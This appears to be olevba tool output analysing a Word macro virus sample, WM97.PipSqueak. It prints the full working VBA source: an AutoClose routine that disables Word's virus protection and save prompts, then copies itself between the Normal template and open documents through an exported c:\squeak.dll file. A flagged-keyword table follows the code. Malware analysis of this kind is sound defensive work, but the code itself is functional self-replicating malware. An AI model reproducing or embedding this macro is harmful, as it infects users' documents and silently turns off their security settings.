olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip-0021800206a5fa8aed73dfb30f9cb35ac7a77c01
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip-0021800206a5fa8aed73dfb30f9cb35ac7a77c01 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO squeak.bas 
in file: Virus.MSWord.Pip-0021800206a5fa8aed73dfb30f9cb35ac7a77c01 - OLE stream: 'Macros/VBA/squeak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose(): On Error Resume Next: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False: Set Norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents: If Norm.Item("squeak").Name <> "squeak" Then Doc("squeak").Export "c:\squeak.dll": Set Infect = NormalTemplate.VBProject: Infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Doc.Item("squeak").Name <> "squeak" Then Norm("squeak").Export "c:\squeak.dll": Set Infect = ActiveDocument.VBProject: Infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Day(Now) = 10 Then MsgBox "I would like you to meet WM97.PipSqueak", 0, "PipSqueak"
End Sub
'WM97.PipSqueak | Psyclone X | DVC
'Coded for smallest macro virus contest
'Please DO NOT spread
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |squeak.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

